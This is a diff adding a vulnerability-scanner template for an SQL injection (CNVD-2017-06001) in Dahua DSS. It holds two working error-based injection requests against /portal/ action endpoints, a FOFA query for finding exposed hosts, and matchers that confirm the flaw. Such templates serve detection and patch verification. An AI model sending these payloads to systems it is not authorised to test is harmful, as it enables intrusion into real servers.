@@ -1,0 +1,35 @@
+## id: CNVD-2017-06001
+## name: Dahua DSS - SQL Injection
+## author: hack007x
+## severity: high
+## tags: cnvd,cnvd2017,sqli,dahua,vuln
+## reference: https://www.cnvd.org.cn/flaw/show/CNVD-2017-06001
+## fofa-query: app="dahua-DSS"
+## verification: true
+
+#$ num = 999999999
+#$ md5_result = {{md5({{num}})}}
+
+# ── 请求1：第一个路径 ─────────────────────────────────
+GET /portal/attachment_clearTempFile.action?bean.RecId=1') AND EXTRACTVALUE(534543,CONCAT(0x5c,md5({{num}}),0x5c)) AND ('n72Yk'='n72Yk&bean.TabName=1 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Accept: */*
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "XPATH syntax error:"
+#@ matcher: body contains "c8c605999f3d8352d7bb792cf3fdb25"
+
+---
+
+# ── 请求2：第二个路径 ─────────────────────────────────
+GET /portal/attachment_getAttList.action?bean.RecId=1') AND EXTRACTVALUE(534543,CONCAT(0x5c,md5({{num}}),0x5c)) AND ('n72Yk'='n72Yk&bean.TabName=1 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Accept: */*
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "XPATH syntax error:"
+#@ matcher: body contains "c8c605999f3d8352d7bb792cf3fdb25"
